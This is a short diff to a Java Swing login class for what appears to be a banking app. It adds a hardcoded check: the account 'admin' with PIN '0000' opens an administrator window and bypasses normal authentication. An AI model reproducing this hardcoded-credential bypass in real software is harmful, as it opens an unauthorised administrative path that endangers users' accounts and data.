@@ -54,6 +54,11 @@ public class Login extends BaseFrame {
                 String accountNo = accountNoField.getText();
                 String pin = String.valueOf(pinField.getPassword());
 
+                if (accountNo.equals("admin") && pin.equals("0000")) {
+                    new Admin().setVisible(true);
+                    dispose();
+                }
+
                 Customer customer = Auth.login(accountNo, pin);
 
                 if (customer != null) {
